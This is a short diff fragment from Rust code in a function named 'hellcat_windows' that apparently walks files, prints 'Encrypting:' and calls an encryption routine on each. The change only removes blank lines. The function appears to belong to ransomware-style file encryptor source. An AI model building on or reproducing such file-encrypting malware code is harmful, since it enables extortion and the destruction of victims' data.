@@ -37,7 +37,4 @@ pub async fn hellcat_windows() {
         println!("Encrypting: {}", full_path);
         enc::encryption(full_path.as_str(), decrypt);
     }
-        
-
-
 }
